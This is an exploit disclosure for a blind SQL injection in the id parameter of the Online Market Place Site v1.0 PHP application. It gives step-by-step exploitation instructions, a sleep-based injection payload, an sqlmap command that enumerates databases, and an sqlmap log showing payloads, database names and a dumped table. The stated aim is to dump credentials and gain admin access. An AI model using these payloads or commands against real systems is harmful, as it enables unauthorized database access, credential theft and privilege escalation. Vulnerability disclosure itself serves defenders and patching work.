# Exploit Title: Online Market Place Site v1.0 - Blind SQL Injection
# Exploit Author: NS Kumar (n1_x)
# Date: April 17, 2022
# Vendor Homepage: https://www.sourcecodester.com/php/15273/online-market-place-site-phpoop-free-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/omps.zip
# Tested on: Parrot Linux, Apache, Mysql
# Vendor: oretnom23
# Version: v1.0
# Exploit Description:
# Online Market Place v1.0 suffers from blind SQL Injection Vulnerability allowing remote attackers to dump all database credential and gain admin access(privilege escalation). 

---------------------------------------- To Exploit ---------------------------------------------------------

Step 1: Register and login as a seller.

Step 2: Goto product page click action and select view product, you can see url like
				http://localhost/omps/seller/?page=products/view_details&id=4

Step 3: The id parameter is the vulnerable one. put the payload '+(select*from(select(sleep(5)))a)+' or copy the url send it to the sqlmap.

step 4: sqlmap query : sqlmap -u http://localhost/omps/seller/?page=products/view_details&id=4 --batch --dbs

step 5: You can Enumerate all database credentials.

--------------------------------------------------------------------------------------------------------------

# Sample Sqlmap log:

	sqlmap identified the following injection point(s) with a total of 133 HTTP(s) requests:
---
	Parameter: id (GET)
    	Type: time-based blind
    	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    	Payload: page=products/view_details&id=1' AND (SELECT 1875 FROM (SELECT(SLEEP(5)))WrPn) AND 'nDbG'='nDbG
---
	web application technology: Apache 2.4.52, PHP 8.1.2
	back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
	sqlmap resumed the following injection point(s) from stored session:
---
	Parameter: id (GET)
    	Type: time-based blind
    	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    	Payload: page=products/view_details&id=1' AND (SELECT 1875 FROM (SELECT(SLEEP(5)))WrPn) AND 'nDbG'='nDbG
---
	web application technology: PHP 8.1.2, Apache 2.4.52
	back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
available databases [16]:
[*] information_schema
[*] LoginSystem
[*] mims
[*] mysql
[*] omps_db
[*] performance_schema
[*] phpmyadmin

---
	sqlmap resumed the following injection point(s) from stored session:
---
	Parameter: id (GET)
    	Type: time-based blind
    	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    	Payload: page=products/view_details&id=1' AND (SELECT 1875 FROM (SELECT(SLEEP(5)))WrPn) AND 'nDbG'='nDbG
---
	web application technology: PHP 8.1.2, Apache 2.4.52
	back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
	sqlmap resumed the following injection point(s) from stored session:
---
	Parameter: id (GET)
    	Type: time-based blind
    	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    	Payload: page=products/view_details&id=1' AND (SELECT 1875 FROM (SELECT(SLEEP(5)))WrPn) AND 'nDbG'='nDbG
---
	web application technology: PHP 8.1.2, Apache 2.4.52
	back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
	sqlmap resumed the following injection point(s) from stored session:
---
	Parameter: id (GET)
    	Type: time-based blind
    	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    	Payload: page=products/view_details&id=1' AND (SELECT 1875 FROM (SELECT(SLEEP(5)))WrPn) AND 'nDbG'='nDbG
---
	web application technology: PHP 8.1.2, Apache 2.4.52
	back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
	Database: omps_db
	Table: category_list
	[3 entries]
+----+------------------+--------+-------------+-----------------------------------------------------+---------------------+---------------------+
| id | name             | status | delete_flag | description                                         | date_created        | date_updated        |
+----+------------------+--------+-------------+-----------------------------------------------------+---------------------+---------------------+
| 1  | Smartphones      | 1      | 0           | This category is for smartphones product            | 2022-04-12 09:38:20 | 2022-04-12 09:39:42 |
| 2  | Motorcycle Parts | 1      | 0           | This category is for the motorcycles parts products | 2022-04-12 09:40:25 | 2022-04-12 09:40:25 |
| 3  | Car Parts        | 1      | 0           | This category is for car parts products.            | 2022-04-12 09:40:52 | 2022-04-12 09:40:52 |
+----+------------------+--------+-------------+-----------------------------------------------------+---------------------+---------------------+


